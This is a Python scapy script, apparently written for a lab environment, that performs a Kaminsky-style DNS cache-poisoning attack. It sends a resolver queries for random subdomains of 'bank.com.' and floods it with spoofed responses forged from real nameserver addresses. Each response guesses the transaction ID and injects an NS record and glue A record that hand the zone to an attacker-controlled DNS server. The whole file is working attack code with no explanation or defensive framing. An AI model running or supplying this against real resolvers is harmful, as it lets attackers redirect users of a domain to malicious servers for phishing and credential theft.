import os
import random
from threading import Thread

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendpfast, Ether

# Vulnerable recursive DNS server settings
victim_dns_ip = os.environ['VLN_SERVER_IP']
victim_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
victim_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])

# Target domain base to be messed with
victim_hostname = "bank.com."

# Malicious DNS server
attacker_dns_ip = os.environ['ATK_SERVER_IP']

MAX_TTL = 60 * 60 * 24 * 7


def a_request(domain):
    return IP(dst=victim_dns_ip, flags=2) / UDP(sport=53, dport=victim_dns_port_in) / DNS(
        id=42,
        qr=0,
        opcode=0,
        rd=1,
        qdcount=1,
        qd=DNSQR(qname=domain, qtype='A', qclass='IN'),
    )


def forged_ns_response(id, target_domain, known_ns_domain, known_ns_ip):
    response = Ether() / IP(src=known_ns_ip, dst=victim_dns_ip, flags=2) / UDP(
        sport=53, dport=victim_dns_port_out) / DNS(
        id=id,  # Query ID / transaction id
        qr=1,  # Response
        opcode=0,  # QUERY
        aa=0,  # No authoritative answers, as we are not sending any answers
        tc=0,  # Not truncated
        rd=0,  # No recursion desired
        ra=0,  # Recursion is not available, please ask attacker dns
        z=0,  # Reserved and must be zero
        rcode=0,  # Response code for "ok"
        qdcount=1,  # Question record count
        nscount=1,  # authority count
        arcount=1,  # additional record count
        # ancount=1,
        # AD and CD bits are defined in RFC 2535
        ad=0,  # Authentic Data
        cd=0,  # Checking Disabled
        # DNS Question Record
        qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
        # DNS Resource Record
        ns=DNSRR(rrname=target_domain, type='NS', rdata="forged." + victim_hostname, ttl=MAX_TTL),
        ar=DNSRR(rrname="forged." + victim_hostname, type='A', rdata=attacker_dns_ip, ttl=MAX_TTL)
    )
    return response


class Poison(Thread):
    def __init__(self, response_amount, known_ns_domain, known_ns_ip, offset):
        self.response_amount = response_amount
        self.known_ns_domain = known_ns_domain
        self.known_ns_ip = known_ns_ip
        self.running = True
        self.offset = offset
        super(Poison, self).__init__()

    def run(self):
        counter = 0
        id = random.randrange(2 ** 16)

        while self.running:
            random_domain = "www{}{}.{}".format(counter, self.offset, victim_hostname)
            counter += 1

            packet_list = [Ether() / a_request(random_domain)]
            for i in range(self.response_amount):
                packet_list.append(
                    forged_ns_response(
                        (id + i) % (2 ** 16),
                        random_domain,
                        self.known_ns_domain,
                        self.known_ns_ip
                    )
                )
            id = (id + self.response_amount) % (2 ** 16)

            print("Sending packets from {} with id in interval [{:#x}, {:#x}] to {}"
                  .format(self.known_ns_ip, id, id + self.response_amount, victim_dns_ip))
            print("Chance of success: 1-(1-{:d}/65536)**{:d} = {:.2f}"
                  .format(self.response_amount, counter, 1 - pow((1 - self.response_amount / 65536.), counter)))

            # Spam forged responses
            sendpfast(packet_list, iface="eth1", verbose=False)

            # Check if it was a hit
            # sleep(1)
            # ns_response = sr1(a_request("forged." + victim_hostname), verbose=False)

            # if ns_response[DNS].an.rdata == attacker_dns_ip:
            #    print("Successfully poisoned the zone of {}".format(victim_hostname))
            #    break
            # else:
            #    print("Poisoning failed")


if __name__ == '__main__':
    known_ns_domain = "ns01.cashparking.com."
    known_ns_ip = "216.69.185.38"

    known_ns_domain_2 = "ns02.cashparking.com."
    known_ns_ip_2 = "208.109.255.38"

    t1 = Poison(600, known_ns_domain, known_ns_ip, 'i')
    # t2 = Poison(600, known_ns_domain_2, known_ns_ip_2, 'b')
    try:
        t1.start()
        # t2.start()
    except KeyboardInterrupt:
        t1.running = False
        # t2.running = False

        # 21:19:57
